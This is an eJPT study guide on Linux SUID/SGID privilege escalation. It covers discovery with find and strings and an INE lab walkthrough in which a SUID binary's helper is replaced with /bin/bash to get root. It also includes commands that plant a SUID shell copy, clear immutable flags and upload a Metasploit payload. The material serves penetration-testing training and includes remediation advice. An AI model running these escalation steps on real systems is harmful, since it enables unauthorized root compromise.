---
title: "SUID/SGID Exploitation Complete Guide"
topic: "Setuid Programs Exploitation"
exam_objective: "Privilege Escalation via SUID/SGID binaries - 15% of eJPT exam"
difficulty: "Medium"
tools:
  - "find"
  - "strings"
  - "file"
  - "ls"
  - "cp"
  - "chmod"
related_labs:
  - "07-exploitation/privilege-escalation.md"
  - "10-post-exploitation/maintaining-access.md"
file_path: "07-exploitation/setuid-exploitation-complete.md"
last_updated: "2025-10-08"
tags:
  - "privilege escalation"
  - "suid"
  - "sgid"
  - "binary exploitation"
  - "linux security"
---

# ðŸ”§ SUID/SGID Exploitation - Complete Privilege Escalation Guide

Complete guide for exploiting SUID (Set User ID) and SGID (Set Group ID) programs for privilege escalation in penetration testing and eJPT exam scenarios.

**Location:** `07-exploitation/setuid-exploitation-complete.md`

## ðŸŽ¯ What is SUID/SGID Exploitation?

SUID (Set User ID) and SGID (Set Group ID) are special permission bits in Unix-like systems that allow programs to run with the privileges of their owner or group, rather than the user executing them. When these permissions are misconfigured or the programs contain vulnerabilities, they can be exploited for privilege escalation.

Key concepts include:
- **SUID bit (4000):** Program runs with owner's privileges
- **SGID bit (2000):** Program runs with group's privileges  
- **Sticky bit (1000):** Restricts file deletion in directories
- **Binary replacement attacks:** Replacing legitimate binaries with malicious ones
- **Path hijacking:** Exploiting insecure PATH variables in SUID programs

## ðŸ“¦ Prerequisites and Setup

### System Requirements:
- Linux target system with SUID/SGID binaries
- Terminal access to target machine
- Basic understanding of Linux file permissions

### Essential Commands Verification:
```bash
# Verify required tools are available
which find strings file ls cp chmod

# Check current user privileges
id
whoami

# Display current working directory
pwd
```

## ðŸ”§ Basic SUID/SGID Discovery Workflow

### Discovery Process:
1. **Find SUID/SGID binaries** on the system
2. **Analyze discovered binaries** for exploitation potential
3. **Identify vulnerable programs** or misconfigurations
4. **Exploit the vulnerability** to escalate privileges
5. **Verify privilege escalation** success

### Command Structure:
```bash
# Basic SUID discovery
find / -type f -perm -4000 2>/dev/null

# Basic SGID discovery  
find / -type f -perm -2000 2>/dev/null

# Combined SUID/SGID search
find / -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null
```

## âš™ï¸ Command Line Options

### Find Command Options for SUID/SGID:
| Option | Purpose | Example |
|--------|---------|---------|
| `-type f` | Search for files only | `find / -type f -perm -4000` |
| `-perm -4000` | SUID bit set | `find / -perm -4000 2>/dev/null` |
| `-perm -2000` | SGID bit set | `find / -perm -2000 2>/dev/null` |
| `-user root` | Owned by root | `find / -user root -perm -4000` |
| `-executable` | Executable files | `find / -executable -perm -4000` |

### File Analysis Options:
| Command | Purpose | Example |
|---------|---------|---------|
| `ls -la` | Detailed file permissions | `ls -la /bin/bash` |
| `file` | Determine file type | `file /usr/bin/welcome` |
| `strings` | Extract readable strings | `strings /usr/bin/welcome` |
| `ldd` | Show library dependencies | `ldd /usr/bin/program` |

### Permission Manipulation:
| Command | Purpose | Example |
|---------|---------|---------|
| `chmod +s` | Set SUID bit | `chmod +s /bin/bash` |
| `chmod 4755` | Set SUID with octal | `chmod 4755 /tmp/shell` |
| `cp` | Copy files | `cp /bin/bash /tmp/rootshell` |
| `chown` | Change ownership | `chown root:root /tmp/shell` |

## ðŸ§ª Real Lab Examples

### Example 1: Basic SUID Binary Discovery and Analysis
```bash
# Lab Step 1: Check connectivity to target
ping -c 4 target.ine.local
# Output: PING target.ine.local (192.74.191.3) 56(84) bytes of data
# 64 bytes from target.ine.local: icmp_seq=1 ttl=64 time=0.093 ms

# Lab Step 2: Access target system terminal
# Access via: http://target.ine.local:8000
# Terminal shows: student@target:~$

# Lab Step 3: Check contents of student directory
ls -l
# Output: 
# total 24
# -rwsr-sr-x 1 root root 8296 Sep 22  2018 greetings
# -rwxr-xr-x 1 root root 8344 Sep 22  2018 welcome

# Lab Step 4: Identify SUID binary
file welcome
# Output: welcome: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV)

# Lab Step 5: Execute welcome binary to understand behavior
./welcome
# Output: Welcome to Attack Defense Labs
```

### Example 2: Binary Analysis with Strings Command
```bash
# Lab Step 6: Analyze binary strings for vulnerabilities
strings welcome
# Output: 
# /lib64/ld-linux-x86-64.so.2
# libc.so.6
# setuid
# system
# __cxa_finalize
# __libc_start_main
# GLIBC_2.2.5
# ITM_deregisterTMCloneTable
# __gmon_start__
# ITM_registerTMCloneTable
# AWAVAUATUHSL
# []A\A]A^A_
# greetings  <-- Potential vulnerability: calls another binary
# GCC: (Ubuntu 7.3.0-16ubuntu3) 7.3.0

# Analysis: The welcome binary calls 'greetings' binary
# This suggests potential path hijacking vulnerability
```

### Example 3: Exploiting SUID Binary via Binary Replacement
```bash
# Lab Step 7: Remove the greetings binary and replace with shell
rm greetings
# Output: rm: remove write-protected regular file 'greetings'? y

# Lab Step 8: Copy /bin/bash to greetings location
cp /bin/bash greetings
# Success: greetings binary replaced with bash shell

# Lab Step 9: Execute welcome binary again
./welcome
# Output: root@target:~# whoami
# root

# Lab Step 10: Verify privilege escalation
id
# Output: uid=0(root) gid=0(root) groups=0(root)

# Lab Step 11: Retrieve flag from root directory
cd /root
ls
# Output: flag

cat flag
# Output: b92bcdc876d52108778e2d81f3b01494
```

### Example 4: Comprehensive SUID Discovery on System
```bash
# Find all SUID binaries system-wide
find / -type f -perm -4000 2>/dev/null
# Output: 
# /usr/bin/chfn
# /usr/bin/chsh
# /usr/bin/passwd
# /usr/bin/sudo
# /bin/mount
# /bin/umount
# /home/student/welcome

# Analyze each discovered binary for exploitation potential
ls -la /usr/bin/passwd
# Output: -rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
```

## ðŸŽ¯ eJPT Exam Focus

### Essential Skills for eJPT (15% of exam):
- **SUID/SGID Discovery (90% importance)** - Finding vulnerable binaries
- **Binary Analysis (85% importance)** - Understanding program behavior
- **Path Exploitation (75% importance)** - Hijacking program execution
- **Privilege Verification (80% importance)** - Confirming successful escalation

### Critical Commands to Master:
```bash
# Essential discovery commands for exam
find / -type f -perm -4000 2>/dev/null    # Find SUID binaries
find / -type f -perm -2000 2>/dev/null    # Find SGID binaries
strings binary_name                        # Analyze binary strings
ls -la binary_path                        # Check permissions

# Essential exploitation commands
cp /bin/bash /tmp/shell                   # Create shell copy
chmod +s /tmp/shell                       # Set SUID on shell
./vulnerable_binary                       # Execute to escalate
```

### eJPT Exam Scenarios:
1. **SUID Binary Discovery:** Finding vulnerable SUID programs on compromised systems
   - Required skills: File system search, permission analysis
   - Expected commands: find, ls -la, file
   - Success criteria: Identify at least 3 SUID binaries

2. **Binary Replacement Attack:** Replacing legitimate programs with shells
   - Required skills: File manipulation, understanding program calls
   - Expected commands: strings, cp, chmod
   - Success criteria: Achieve root privileges via binary replacement

### Exam Tips and Tricks:
- **Always check /tmp and /home directories** - Often contain custom SUID binaries
- **Use strings command immediately** - Reveals program dependencies and calls
- **Test basic binary replacement first** - Simplest and most reliable method
- **Document all discovered SUID binaries** - May be useful for multiple escalation paths

### Common eJPT Questions:
- Identify SUID binaries that can be exploited for privilege escalation
- Demonstrate binary replacement technique for privilege escalation

## âš ï¸ Common Issues & Troubleshooting

### Issue 1: Permission Denied When Removing Protected Files
**Problem:** Cannot remove write-protected files even with correct permissions
**Cause:** File attributes or immutable flags set on files
**Solution:**
```bash
# Check file attributes
lsattr filename

# Remove immutable attribute if present
chattr -i filename

# Then proceed with removal
rm filename
```

### Issue 2: Binary Replacement Doesn't Work
**Problem:** Replacing binary doesn't result in privilege escalation
**Solution:**
```bash
# Ensure proper file permissions
chmod +x replacement_binary

# Verify the original binary actually has SUID bit
ls -la original_binary

# Check if program uses absolute paths
strings original_binary | grep "/"
```

### Issue 3: Find Command Returns Too Many Results
**Problem:** SUID search returns overwhelming number of results
**Optimization:**
```bash
# Focus on non-standard locations
find /home /tmp /opt -type f -perm -4000 2>/dev/null

# Exclude common system directories
find / -path /proc -prune -o -path /sys -prune -o -type f -perm -4000 -print 2>/dev/null
```

### Issue 4: Strings Command Shows No Useful Information
**Problem:** Binary appears to have no readable strings
**Analysis:**
```bash
# Try different string extraction methods
strings -a binary_name          # All strings
hexdump -C binary_name | head   # Hex dump analysis
objdump -d binary_name | head   # Disassembly
```

## ðŸ”— Integration with Other Tools

### Primary Integration: Find + Strings + File Analysis
```bash
# Complete workflow for SUID discovery and analysis
find / -type f -perm -4000 2>/dev/null | while read binary; do
    echo "=== Analyzing: $binary ==="
    ls -la "$binary"
    file "$binary"
    strings "$binary" | head -10
    echo "---"
done
```

### Secondary Integration: SUID Discovery â†’ Metasploit
```bash
# After discovering SUID binaries, use in Metasploit sessions
# Upload custom payloads to replace SUID binaries
meterpreter > upload /tmp/payload /home/user/vulnerable_binary
meterpreter > shell
# Then execute the replaced binary for escalation
```

### Advanced Workflows:
```bash
# Automated SUID exploitation script
#!/bin/bash
echo "SUID Binary Discovery and Analysis"
find / -type f -perm -4000 2>/dev/null > /tmp/suid_binaries.txt
while read binary; do
    if strings "$binary" | grep -q "system\|exec\|popen"; then
        echo "Potentially exploitable: $binary"
        strings "$binary" | grep -E "system|exec|popen"
    fi
done < /tmp/suid_binaries.txt
```

## ðŸ“ Documentation and Reporting

### Evidence Collection Requirements:
1. **Screenshots:** Terminal outputs showing SUID discovery and exploitation
2. **Command Outputs:** Full find command results and strings analysis
3. **Before/After States:** User privileges before and after exploitation
4. **File Listings:** Detailed permissions of exploited binaries

### Report Template Structure:
```markdown
## SUID/SGID Exploitation Results

### Target Information
- Target: target.ine.local
- Date/Time: 2025-10-08 14:29
- Initial User: student
- Target Privileges: root

### Discovery Phase
```bash
# SUID binary discovery
find / -type f -perm -4000 2>/dev/null
# Results: /home/student/welcome (vulnerable)
```

### Analysis Phase
```bash
# Binary analysis
strings /home/student/welcome
# Key finding: Binary calls 'greetings' program
```

### Exploitation Phase
```bash
# Binary replacement attack
rm greetings
cp /bin/bash greetings
./welcome
# Result: root shell obtained
```

### Impact Assessment
- **Severity:** High - Complete system compromise
- **Impact:** Full root access achieved
- **Business Risk:** Complete server takeover possible

### Recommendations
- Remove unnecessary SUID bits from custom programs
- Implement proper input validation in SUID programs
- Regular audit of SUID/SGID binaries
- Use absolute paths in SUID programs to prevent hijacking
```

### Automation Scripts:
```bash
#!/bin/bash
# SUID Discovery and Documentation Script
echo "=== SUID/SGID Binary Audit ===" > suid_audit.txt
echo "Date: $(date)" >> suid_audit.txt
echo "System: $(hostname)" >> suid_audit.txt
echo "" >> suid_audit.txt

echo "SUID Binaries:" >> suid_audit.txt
find / -type f -perm -4000 2>/dev/null >> suid_audit.txt
echo "" >> suid_audit.txt

echo "SGID Binaries:" >> suid_audit.txt  
find / -type f -perm -2000 2>/dev/null >> suid_audit.txt
```

## ðŸ“š Additional Resources

### Official Documentation:
- Linux File Permissions Guide: https://www.linux.org/docs/man1/chmod.html
- SUID/SGID Security: https://www.redhat.com/sysadmin/suid-sgid-sticky-bit
- Find Command Manual: https://www.gnu.org/software/findutils/manual/html_mono/find.html

### Learning Resources:
- OverTheWire Bandit Wargames: https://overthewire.org/wargames/bandit/
- Linux Privilege Escalation Course: Various platforms offer hands-on labs
- GTFOBins Database: https://gtfobins.github.io/ (SUID exploitation techniques)

### Community Resources:
- r/linuxquestions: Reddit community for Linux troubleshooting
- Linux Security Forums: Multiple communities focus on privilege escalation
- Pentesting Discord/Slack: Real-time help with exploitation techniques

### Related Tools:
- **LinEnum:** Automated Linux enumeration including SUID discovery
- **LinPEAS:** Comprehensive privilege escalation enumeration script  
- **pspy:** Process monitoring for identifying SUID program behavior
- **Unix-privesc-check:** Another automated privilege escalation checker
